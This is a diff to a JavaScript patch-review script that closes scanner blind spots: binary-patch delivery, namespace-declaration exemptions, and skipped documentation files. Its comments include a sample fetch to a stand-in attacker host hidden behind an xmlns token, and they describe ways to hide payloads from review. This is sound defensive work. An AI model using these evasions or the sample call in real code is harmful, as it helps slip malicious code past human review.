@@ -95,6 +95,7 @@ function parsePatch(text) {
         aPath: m ? m[1] : null, bPath: m ? m[2] : null,
         added: [], isNew: false, isDeleted: false, isRename: false,
         modeExec: false, isSymlink: false, isSubmodule: false,
+        isBinary: false,
       };
       files.push(cur);
       newLine = 0;
@@ -105,6 +106,13 @@ function parsePatch(text) {
     if (line.startsWith("deleted file mode ")) { cur.isDeleted = true; flagMode(cur, line); continue; }
     if (line.startsWith("old mode ") || line.startsWith("new mode ")) { flagMode(cur, line); continue; }
     if (line.startsWith("rename from ") || line.startsWith("rename to ")) { cur.isRename = true; continue; }
+    // A file arriving as a binary patch contributes NO added lines, so every
+    // scan that reads `added` silently sees an empty file rather than skipping
+    // a known-unreadable one. Recorded so the caller can tell the difference.
+    if (line.startsWith("GIT binary patch") || /^Binary files .* differ$/.test(line)) {
+      cur.isBinary = true;
+      continue;
+    }
     if (line.startsWith("--- ")) { if (line === "--- /dev/null") cur.isNew = true; continue; }
     if (line.startsWith("+++ ")) {
       if (line === "+++ /dev/null") cur.isDeleted = true;
@@ -203,6 +211,28 @@ function main() {
   gate("1 scope: no executable bits added", exec.length === 0, exec.join(", "));
   gate("1 scope: no symlinks added", symlinks.length === 0, symlinks.join(", "));
   gate("1 scope: no submodules added", submodules.length === 0, submodules.join(", "));
+
+  // Source that arrives as a binary patch is source nothing downstream can
+  // read. Every scan works from the patch's added lines, so a file with none
+  // is indistinguishable from an empty file — the capability scan reports
+  // `(none)` and reads as a clean result rather than as an unread one.
+  //
+  // The route is an in-addon `.gitattributes` saying `*.js -diff`, which is now
+  // a sensitive path above; this gate is the second layer, because the attribute
+  // can also be set elsewhere and because a gate should not depend on having
+  // enumerated every way of reaching it.
+  const SCANNABLE_EXT = /\.(ts|tsx|js|jsx|mjs|cjs|html|css|json|md|txt|ya?ml)$/i;
+  const binarySource = files
+    .filter((f) => f.isBinary && SCANNABLE_EXT.test(pathOf(f) || ""))
+    .map(pathOf);
+  gate(
+    "1 scope: no text file delivered as a binary patch",
+    binarySource.length === 0,
+    binarySource.length
+      ? `${binarySource.join(", ")} — these carry no readable diff, so every scan below sees them ` +
+        `as empty rather than as unread`
+      : "",
+  );
 
   // ── Stage 2: applies cleanly to base ──────────────────────────────────────
   let applies = false;
@@ -398,7 +428,11 @@ function main() {
   const isLockfile = (p) => /(^|\/)package-lock\.json$/.test(p);
   // `xmlns="http://www.w3.org/2000/svg"` names an XML namespace. Nothing is
   // fetched from it, and an icon file is not an egress site.
-  const isNamespaceDecl = (t) => /\bxmlns(:\w+)?\s*=/.test(t);
+  //
+  // Only the ATTRIBUTE is removed, not the line. Dropping the whole line let a
+  // real host hide behind the token: `fetch("https://evil.tld/x") /* xmlns= */`
+  // disappeared from the list entirely, and stage 5 does not strip comments.
+  const withoutNamespaceDecls = (t) => t.replace(/\bxmlns(:\w+)?\s*=\s*(["'])[^"']*\2/g, " ");
 
   const hosts = new Set();
   const docHosts = new Set();
@@ -406,9 +440,27 @@ function main() {
     const items = [];
     for (const f of files) {
       const p = pathOf(f);
-      if (isDoc(p)) continue;
       for (const { line, text } of f.added) {
-        if (cat.patterns.some((re) => re.test(text))) items.push({ file: p, line, text: text.trim().slice(0, 160) });
+        if (cat.patterns.some((re) => re.test(text))) {
+          // DOCUMENTATION IS SCANNED, AND LABELLED. An earlier version of this
+          // skipped doc files for every category, which opened a blind spot
+          // rather than closing a false positive: Node's CJS `require('./NOTICE')`
+          // and `node tools/build.txt` both execute those files as JavaScript, so
+          // a payload kept in one would have been invisible to every category.
+          // Verified: a `.txt` containing `child_process`, `exec(` and an
+          // exfiltration host returned "no items flagged".
+          //
+          // The prose problem this was reaching for is real, but it is a problem
+          // about HOSTS, and that is handled below by reporting documentation
+          // hosts separately. Here the fix is to say where the match came from,
+          // so a reviewer can discount a README sentence without the scan having
+          // to guess for them.
+          items.push({
+            file: isDoc(p) ? `${p} (documentation — not necessarily code)` : p,
+            line,
+            text: text.trim().slice(0, 160),
+          });
+        }
       }
     }
     if (items.length) queue.push({ category: cat.label, key: cat.key, items });
@@ -418,8 +470,7 @@ function main() {
     if (isLockfile(p)) continue;
     const into = isDoc(p) ? docHosts : hosts;
     for (const { text } of f.added) {
-      if (isNamespaceDecl(text)) continue;
-      for (const m of text.matchAll(URL_RE)) into.add(m[1] ?? m[2]);
+      for (const m of withoutNamespaceDecls(text).matchAll(URL_RE)) into.add(m[1] ?? m[2]);
     }
   }
   for (const h of hosts) docHosts.delete(h);
